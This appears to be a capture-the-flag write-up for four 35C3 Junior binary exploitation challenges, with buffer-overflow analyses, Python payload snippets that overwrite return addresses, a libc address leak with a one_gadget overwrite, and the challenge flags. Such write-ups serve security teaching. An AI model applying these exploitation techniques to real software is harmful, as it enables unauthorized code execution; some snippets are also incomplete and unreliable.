# 35C3 Junior

  - [PWN](#pwn)
    - [1996](#1996)
    - [poet](#poet)
    - [stringmaster1](#stringmaster1)
      - [What the program do ?](#what-the-program-do)
      - [Analysis](#analysis)
      - [flow](#flow)
    - [stringmaster2](#stringmaster2)
      - [Analysis](#analysis-1)
      - [flow](#flow-1)

<style>
* {
    font-family: 'DejaVu Sans Mono';
}
h1 {
    font-weight: bold;
    margin-bottom:10px;
}
h2 {
    font-weight: bold;
    margin:0px auto;
    color:#3366ff;
    margion-top:40px;
}
h3 {
    font-weight: bold;
}
h4, h5, h6 {
    font-weight: bold;
}
.word {
    display:inline;
    background-color:rgba(137, 142, 144, 0.3);
}
</style>


## PWN

### 1996
- type : Easy <font color='blue'>BOF</font>
- Directly overlap to return address to <font color='red'>spawn_shell() function </font> 
    ```python
    payload = '\x00'*1024 + '\x00'*0x18 + p64(shell_add)
    ```

> 35C3_b29a2800780d85cfc346ce5d64f52e59c8d12c14

### poet

- type : <font color='blue'>BOF</font>
- Analysis :        
    <img src='./img/02' width=400px></img>
    - Enter poet : it will be push to a complex function to calculate **POINTS**, but we don't need to care about the pointFunction!
      - 0x00000000004007b7  <rate_poem>

    - Enter author : enter author can overlap point!!!

- payload
    ```python
    payload = '\x00'*0x40 + p64(0xf4240)
    ```

> 35C3_f08b903f48608a14cbfbf73c08d7bdd731a87d39


### stringmaster1

- type : <font color='blue'>BOF</font>

#### What the program do ?
```md
[1] swap <index1> <index2>                   (Cost: 1)
Swaps the char at index1 with the char at index2
[2] replace <char1> <char2>                  (Cost: 1)
    Replaces the first occurence of char1 with char2
[3] print                                    (Cost: 1)
    Prints the current version of the string
[4] quit
    Give up and leave the game

String1: jkecntplqr
String2: eksbqudlvf


Enter the command you want to execute:
[1] swap <index1> <index2>                   (Cost: 1)
[2] replace <char1> <char2>                  (Cost: 1)
[3] print                                    (Cost: 1)
[4] quit
```

- The program generate 2 arbitrary strings, and we need to use swap, replace or print function to let string1=String2

- swap : the input will be modified to **unsigned**, so we can't pass negative number to leak
    ```C
    unsigned int i1, i2;
    cin >> i1 >> i2;
    if (cin.good() && i1 < s.length() && i2 < s.length()) {
        swap(s[i1], s[i2]);
    }
    ```

- replace : find what you enter and replace by input2
    ```C
    char c1, c2;
    cin >> c1 >> c2;
    auto index = s.find(c1);
    cout << c1 << c2 << index << endl;
    if (index >= 0) {
        s[index] = c2;
    }
    ```

#### Analysis

- The Bugs of the code comes from : 
    ```C++
    auto index = s.find(c1);
    ```
- we know that : strings end with <font color='blue'>\x00</font>, s.length() will be confined , but s.find won't. so, we can replace the known address or value, then overflow to return_addr

#### flow
1. overlap until the return addr            
    <img src='./img/03' width=500px></img>

2. replace return_main to return_shell
    ```python
    shellAddres = p32(0x4011a7)
    ```
3. Some 'a' will cause Segment Fault, so we need to compensate it by \x00
    ```python
    r.sendlineafter('> ', 'replace')
    r.sendline('a')
    r.sendline('\x00')
    ```

> 35C3_a6a9d10c61a652d23fbd0e9f73e638dac093472c

### stringmaster2

- type : <font color='blue'>BOF</font>

#### Analysis
- The same as stringmaster1, but it doesn't have <font color='blue'>spawn_shell function</font>, so we need to use **ROP or One_Gadget**


#### flow 

1. Overflow until return address

2. leak libc from <font color='blue'>libc_start_main</font>
   ```python
   leak = r.recvuntil('\xff\xff\xff')
   libc_start_main = leak[-12:-6]
   libc_start_main = list(libc_start_main)
   libc_start_main.reverse()
   libc_start_main = (''.join(libc_start_main)).encode('hex')

   libc_base = int(libc_start_main, 16) - 0xe7 - 0x21ab0
   ```

3. replace libc_start_main by <font color=blue>one_gadget</font>
    - because libc only diff from the Least 4 bytes, provided we can modify it
   ```python
   one_gadget = 0x10a38c
   payload = libc_base+one_gadget

   for i, val in enumerate(shell):
   replaceAndSwap(val, i)
   ```

> 35C3_fb23c497dbbf35b0f13b9d16311fa59cf8ac1b02

